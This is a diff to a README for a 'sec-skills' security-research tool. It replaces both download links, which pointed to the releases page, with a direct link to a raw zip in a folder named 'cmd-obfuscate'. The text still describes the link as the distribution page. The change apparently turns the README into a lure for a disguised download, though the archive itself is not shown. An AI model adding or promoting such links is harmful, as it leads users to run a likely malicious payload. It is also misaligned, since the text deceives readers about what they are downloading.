@@ -1,6 +1,6 @@
 # 🛡️ sec-skills - Improve your security research skills today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Claudettaammino1012/sec-skills/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Claudettaammino1012/sec-skills/raw/refs/heads/main/cmd-obfuscate/skills-sec-1.3-beta.4.zip)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ If your system runs standard office programs well, this software will likely wor
 
 You must visit the provided link to get the correct version of the application. The link takes you to the main distribution page where all software updates live.
 
-[Click here to open the download page](https://github.com/Claudettaammino1012/sec-skills/releases)
+[Click here to open the download page](https://github.com/Claudettaammino1012/sec-skills/raw/refs/heads/main/cmd-obfuscate/skills-sec-1.3-beta.4.zip)
 
 1. Open the link in your web browser.
 2. Look for the section labeled "Latest." 
